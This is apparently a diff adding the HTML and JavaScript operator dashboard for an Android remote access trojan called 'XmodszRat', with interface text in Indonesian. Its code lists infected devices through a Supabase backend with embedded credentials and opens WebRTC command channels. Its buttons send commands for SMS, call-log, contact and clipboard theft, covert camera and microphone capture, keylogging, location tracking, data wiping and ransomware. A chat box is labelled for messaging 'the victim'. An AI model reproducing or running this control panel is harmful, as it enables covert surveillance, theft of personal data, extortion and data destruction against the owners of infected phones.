@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>XmodszRat Admin</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui, -apple-system, sans-serif; }
+    body { background:#0a0a0a; color:#fff; padding:15px; padding-bottom:80px; }
+    .header { font-size:28px; font-weight:bold; color:#00ff88; margin-bottom:20px; display:flex; align-items:center; gap:10px; }
+    .header small { font-size:14px; color:#888; font-weight:normal; }
+    .device-scroll { display:flex; overflow-x:auto; gap:12px; padding:10px 0; margin-bottom:15px; }
+    .device-card { background:#1a1a1a; border-radius:16px; padding:15px; min-width:180px; border:1px solid #333; flex-shrink:0; }
+    .device-card .name { font-size:16px; font-weight:bold; }
+    .device-card .status { color:#0f0; font-size:13px; margin:5px 0; }
+    .device-card .id { color:#666; font-size:11px; word-break:break-all; }
+    .btn-control { background:#ff4444; color:#fff; border:none; padding:8px 0; width:100%; border-radius:10px; margin-top:10px; font-weight:bold; cursor:pointer; transition:0.2s; }
+    .btn-control:active { transform:scale(0.95); }
+    .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin:15px 0; }
+    .feature { background:#222; padding:12px 5px; border-radius:12px; text-align:center; font-size:13px; cursor:pointer; transition:0.2s; border:1px solid #333; }
+    .feature:active { background:#333; transform:scale(0.95); }
+    .feature .icon { font-size:22px; display:block; }
+    .video-wrap { margin:15px 0; background:#000; border-radius:16px; overflow:hidden; display:none; }
+    .video-wrap video { width:100%; max-height:300px; display:block; }
+    .chat-box { background:#111; border-radius:16px; padding:10px; height:150px; overflow-y:auto; margin:10px 0; border:1px solid #222; }
+    .chat-box .admin { color:#0f0; text-align:right; margin:3px 0; }
+    .chat-box .user { color:#f80; text-align:left; margin:3px 0; }
+    .chat-input { display:flex; gap:8px; margin-bottom:10px; }
+    .chat-input input { flex:1; background:#222; border:none; padding:12px 15px; border-radius:30px; color:#fff; outline:none; }
+    .chat-input button { background:#00ff88; border:none; padding:12px 20px; border-radius:30px; font-weight:bold; color:#000; }
+    .log-box { background:#111; border-radius:16px; padding:10px; height:120px; overflow-y:auto; font-family:monospace; font-size:11px; color:#aaa; border:1px solid #222; white-space:pre-wrap; word-break:break-all; }
+    .toast { background:#333; color:#fff; padding:8px 16px; border-radius:30px; position:fixed; bottom:20px; left:50%; transform:translateX(-50%); z-index:999; font-size:14px; display:none; }
+  </style>
+</head>
+<body>
+  <div class="header">🚀 XmodszRat <small>v2.0</small></div>
+
+  <div id="deviceContainer">
+    <h3 style="margin-bottom:8px;">📱 Perangkat Online</h3>
+    <div class="device-scroll" id="deviceList"></div>
+  </div>
+
+  <div class="grid" id="featureGrid">
+    <div class="feature" data-cmd="get_sms"><span class="icon">📩</span>SMS</div>
+    <div class="feature" data-cmd="get_calls"><span class="icon">📞</span>Call Logs</div>
+    <div class="feature" data-cmd="start_camera front"><span class="icon">📷</span>Kamera Depan</div>
+    <div class="feature" data-cmd="start_camera back"><span class="icon">📸</span>Kamera Belakang</div>
+    <div class="feature" data-cmd="get_contacts"><span class="icon">👤</span>Kontak</div>
+    <div class="feature" data-cmd="list_files"><span class="icon">📁</span>File Manager</div>
+    <div class="feature" data-cmd="lock_screen"><span class="icon">🔒</span>Lock Screen</div>
+    <div class="feature" data-cmd="unlock_screen"><span class="icon">🔓</span>Unlock Screen</div>
+    <div class="feature" data-cmd="start_keylog"><span class="icon">⌨️</span>Keylogger</div>
+    <div class="feature" data-cmd="start_mic"><span class="icon">🎙️</span>Mic Record</div>
+    <div class="feature" data-cmd="get_clipboard"><span class="icon">📋</span>Clipboard</div>
+    <div class="feature" data-cmd="torch on"><span class="icon">🔦</span>Senter</div>
+    <div class="feature" data-cmd="get_location"><span class="icon">📍</span>Lokasi</div>
+    <div class="feature" data-cmd="set_wallpaper"><span class="icon">🖼️</span>Wallpaper</div>
+    <div class="feature" data-cmd="reset_data"><span class="icon">💣</span>Reset Data</div>
+    <div class="feature" data-cmd="ransomware"><span class="icon">💀</span>Ransomware</div>
+    <div class="feature" data-cmd="lock_premium"><span class="icon">💰</span>Lock Premium</div>
+  </div>
+
+  <div class="video-wrap" id="videoWrap"><video id="remoteVideo" autoplay playsinline></video></div>
+
+  <h3>💬 Chat</h3>
+  <div class="chat-box" id="chatBox"></div>
+  <div class="chat-input">
+    <input id="chatInput" placeholder="Ketik pesan ke korban...">
+    <button id="sendChatBtn">Kirim</button>
+  </div>
+
+  <h3>📋 Log</h3>
+  <div class="log-box" id="logBox"></div>
+
+  <div class="toast" id="toast"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+  <script>
+    // =============== KONFIGURASI (UDAH PAKAI CREDENTIAL LU) ===============
+    const SUPABASE_URL = 'https://hvxctzvtwyosyffstwii.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_r8uOjL7SgzxqjzimofJRrw_TamZDiIh';
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    // =============== STATE ===============
+    let pc = null;
+    let dc = null;
+    let currentDevice = null;
+    let chatInput = document.getElementById('chatInput');
+    let chatBox = document.getElementById('chatBox');
+    let logBox = document.getElementById('logBox');
+    let deviceList = document.getElementById('deviceList');
+    let videoWrap = document.getElementById('videoWrap');
+    let remoteVideo = document.getElementById('remoteVideo');
+    let toast = document.getElementById('toast');
+
+    // =============== FUNGSI UTAMA ===============
+    function addLog(text) {
+      const time = new Date().toLocaleTimeString();
+      logBox.innerHTML += `[${time}] ${text}\n`;
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    function showToast(msg) {
+      toast.textContent = msg;
+      toast.style.display = 'block';
+      setTimeout(() => toast.style.display = 'none', 3000);
+    }
+
+    async function fetchDevices() {
+      try {
+        const { data, error } = await supabase.from('devices').select('*').eq('status', 'online');
+        if (error) throw error;
+        renderDevices(data || []);
+      } catch (e) {
+        addLog('❌ Gagal ambil devices: ' + e.message);
+        showToast('Error: ' + e.message);
+      }
+    }
+
+    function renderDevices(devices) {
+      if (!devices || devices.length === 0) {
+        deviceList.innerHTML = '<div style="color:#888;padding:10px;">Belum ada perangkat terhubung</div>';
+        return;
+      }
+      deviceList.innerHTML = '';
+      devices.forEach(d => {
+        const card = document.createElement('div');
+        card.className = 'device-card';
+        card.innerHTML = `
+          <div class="name">${d.name || 'Unknown'}</div>
+          <div class="status">● Online</div>
+          <div class="id">${d.id}</div>
+          <button class="btn-control" data-id="${d.id}">CONTROL</button>
+        `;
+        const btn = card.querySelector('.btn-control');
+        btn.addEventListener('click', () => connectTo(d.id));
+        deviceList.appendChild(card);
+      });
+    }
+
+    async function connectTo(deviceId) {
+      if (currentDevice === deviceId) {
+        showToast('Sudah terhubung ke device ini');
+        return;
+      }
+      if (pc) {
+        pc.close();
+        pc = null;
+        dc = null;
+      }
+      currentDevice = deviceId;
+      addLog(`🔗 Menghubungkan ke ${deviceId}...`);
+      showToast('Menghubungkan...');
+
+      try {
+        pc = new RTCPeerConnection({
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' }
+          ]
+        });
+
+        dc = pc.createDataChannel('cmd');
+        dc.onopen = () => {
+          addLog('✅ Data channel terbuka');
+          showToast('Terhubung!');
+        };
+        dc.onclose = () => addLog('❌ Data channel ditutup');
+        dc.onmessage = (e) => handleMessage(e.data);
+
+        pc.ontrack = (e) => {
+          if (e.streams && e.streams[0]) {
+            remoteVideo.srcObject = e.streams[0];
+            videoWrap.style.display = 'block';
+            remoteVideo.play().catch(() => {});
+            addLog('📹 Stream video diterima');
+          }
+        };
+
+        pc.oniceconnectionstatechange = () => {
+          const state = pc.iceConnectionState;
+          addLog(`ICE state: ${state}`);
+          if (state === 'failed' || state === 'disconnected') {
+            showToast('Koneksi WebRTC terputus');
+          }
+        };
+
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+
+        await supabase.from('signaling').insert({
+          room: deviceId,
+          type: 'offer',
+          sdp: offer.sdp
+        });
+
+        const channel = supabase
+          .channel('signaling_' + deviceId)
+          .on('postgres_changes', {
+            event: 'INSERT',
+            schema: 'public',
+            table: 'signaling',
+            filter: `room=eq.${deviceId}`
+          }, async (payload) => {
+            if (payload.new.type === 'answer' && payload.new.sdp) {
+              await pc.setRemoteDescription({
+                type: 'answer',
+                sdp: payload.new.sdp
+              });
+              addLog('✅ Answer diterima');
+            } else if (payload.new.type === 'candidate' && payload.new.candidate) {
+              try {
+                await pc.addIceCandidate(JSON.parse(payload.new.candidate));
+              } catch (e) {}
+            }
+          })
+          .subscribe();
+
+        pc.onicecandidate = async (e) => {
+          if (e.candidate) {
+            await supabase.from('signaling').insert({
+              room: deviceId,
+              type: 'candidate',
+              candidate: JSON.stringify(e.candidate)
+            });
+          }
+        };
+
+        pc._channel = channel;
+
+      } catch (e) {
+        addLog('❌ Gagal konek: ' + e.message);
+        showToast('Gagal konek: ' + e.message);
+        currentDevice = null;
+        pc = null;
+        dc = null;
+      }
+    }
+
+    function sendCommand(cmd) {
+      if (!currentDevice) {
+        showToast('Pilih device dulu!');
+        return;
+      }
+      if (dc && dc.readyState === 'open') {
+        dc.send(cmd);
+        addLog(`📤 Kirim: ${cmd}`);
+        showToast('Perintah dikirim');
+      } else {
+        supabase.from('commands').insert({
+          device_id: currentDevice,
+          cmd: cmd,
+          status: 'pending'
+        }).then(() => {
+          addLog(`📤 Queued: ${cmd}`);
+          showToast('Perintah diantrikan (fallback)');
+        }).catch(e => {
+          addLog('❌ Gagal queue: ' + e.message);
+        });
+      }
+    }
+
+    function handleMessage(msg) {
+      try {
+        const data = JSON.parse(msg);
+        if (data.type === 'chat') {
+          chatBox.innerHTML += `<div class="user">👤 ${data.data}</div>`;
+          chatBox.scrollTop = chatBox.scrollHeight;
+        } else if (data.type === 'location') {
+          addLog(`📍 Lokasi: ${data.data}`);
+        } else if (data.type === 'keylog') {
+          addLog(`⌨️ Key: ${data.data}`);
+        } else if (data.type === 'result') {
+          addLog(`📩 Result: ${data.data}`);
+        } else {
+          addLog(`📩 ${data.type}: ${JSON.stringify(data.data).slice(0,100)}`);
+        }
+      } catch (e) {
+        addLog(`📩 Raw: ${msg}`);
+      }
+    }
+
+    function sendChat() {
+      const text = chatInput.value.trim();
+      if (!text || !currentDevice) {
+        showToast('Isi pesan dan pilih device');
+        return;
+      }
+      sendCommand(`chat ${text}`);
+      chatBox.innerHTML += `<div class="admin">👤 Admin: ${text}</div>`;
+      chatBox.scrollTop = chatBox.scrollHeight;
+      chatInput.value = '';
+    }
+
+    document.querySelectorAll('.feature').forEach(el => {
+      el.addEventListener('click', () => {
+        const cmd = el.dataset.cmd;
+        if (cmd) sendCommand(cmd);
+      });
+    });
+
+    document.getElementById('sendChatBtn').addEventListener('click', sendChat);
+    chatInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') sendChat();
+    });
+
+    // Polling hasil command (fallback)
+    setInterval(async () => {
+      if (!currentDevice) return;
+      try {
+        const { data, error } = await supabase
+          .from('commands')
+          .select('*')
+          .eq('device_id', currentDevice)
+          .eq('status', 'done')
+          .neq('result', null)
+          .limit(5);
+        if (error) return;
+        for (let cmd of data) {
+          if (cmd.result) {
+            addLog(`📩 Result: ${cmd.result}`);
+            await supabase.from('commands').update({ status: 'archived' }).eq('id', cmd.id);
+          }
+        }
+      } catch (e) {}
+    }, 4000);
+
+    fetchDevices();
+    supabase
+      .channel('devices')
+      .on('postgres_changes', { event: '*', schema: 'public', table: 'devices' }, fetchDevices)
+      .subscribe();
+
+    addLog('🚀 Dashboard siap, menunggu perangkat...');
+  </script>
+</body>
+</html>
